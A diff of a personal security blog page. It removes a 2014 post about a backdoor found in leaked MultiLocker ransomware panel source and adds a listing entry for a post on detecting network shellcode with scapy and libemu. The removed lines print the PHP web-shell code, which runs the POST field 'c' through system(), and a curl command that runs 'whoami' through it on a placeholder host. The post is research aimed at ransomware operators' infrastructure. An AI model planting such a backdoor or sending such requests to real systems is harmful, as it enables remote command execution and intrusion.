@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1, user-scalable=yes">
-  <title>MultiLocker Backdoor</title>
+  <title>Pocs</title>
   <script src="https://bwall.github.io//bower_components/webcomponentsjs/webcomponents-lite.js"></script>
   <link rel="import" href="https://bwall.github.io//bower_components/iron-icons/iron-icons.html">
   <link rel="import" href="https://bwall.github.io//bower_components/paper-drawer-panel/paper-drawer-panel.html">
@@ -143,65 +143,45 @@
 
 <div class="content">
 
+
   <div class="article">
-    <div class="title">MultiLocker Backdoor</div>
+    <div class="title"><a href="https://bwall.github.io/libemu-scapy-for-shellcode-on-the-network/">Detecting shellcode over the network with scapy and libemu</a></div>
     
       <div class="categories">
         
-          <a href="https://bwall.github.io//categories/botnets/">Botnets</a>
+          <a href="https://bwall.github.io//categories/pocs/">PoCs</a>
         
       </div>
      
-    <div class="description"><p>In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&rsquo;s panel.</p>
-
-<!-- more -->
-
-<p>While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &lsquo;lending/PL.php&rsquo;, there is some obvious backdoor code.</p>
-
-<pre><code>if (!empty($_POST['c']))
-{
-system($_POST['c']);
-die();
-}
-</code></pre>
-
-<p>This can easily be accessed with curl or wget (let&rsquo;s assume <a href="http://c2.panel/">http://c2.panel/</a> is the MultiLocker panel root).</p>
-
-<pre><code>curl -v -d &quot;c=whoami&quot; http://c2.panel/lending/PL.php
-</code></pre>
-
-<p>For more information on MultiLocker, you can check out a great blog post on it <a href="http://www.xylibox.com/2012/11/multi-locker.html">here</a>.</p>
-</div>
+    <div class="description">In this blog post, I will describe a method of using libemu along with scapy in order to detect shellcode being sent across the network in unencrypted channels. This method would not be particularly reasonable for large networks without a significant amount of computing power. On the other hand, for semi-automated analysis, or even integration into something like Cuckoo Sandbox, it may be quite useful. While this proof of concept is currently functional, it would take some work on the project&rsquo;s dependencies in order for me to consider the project a success.</div>
     <div class="tags">
-      9 Mar 2014
+      11 Oct 2015
       
         
-          <a href="https://bwall.github.io//tags/botnet/">#botnet</a>
+          <a href="https://bwall.github.io//tags/network/">#network</a>
         
-          <a href="https://bwall.github.io//tags/multilocker/">#multilocker</a>
+          <a href="https://bwall.github.io//tags/python/">#python</a>
         
-          <a href="https://bwall.github.io//tags/exploit/">#exploit</a>
-        
-          <a href="https://bwall.github.io//tags/vulnerability/">#vulnerability</a>
-        
-          <a href="https://bwall.github.io//tags/backdoor/">#backdoor</a>
+          <a href="https://bwall.github.io//tags/project/">#project</a>
         
        
     </div>
-    
   </div>
+
 
 </div>
 
+
 <paper-item>
   
-    <a href="https://bwall.github.io/murdering-dexter/"><paper-fab icon="chevron-left"><a></a></paper-fab></a>
+    <paper-fab disabled icon="chevron-left"></paper-fab>
   
     <div class="flex"></div>
   
-    <a href="https://bwall.github.io/herpes-net-3.0-sqli/"><paper-fab icon="chevron-right"></paper-fab></a>
+    <paper-fab disabled icon="chevron-right"></paper-fab>
   
 </paper-item>
+
 
       <paper-item>
         <div class="copyright">© 2015 Copyright Brian Wallace</div>
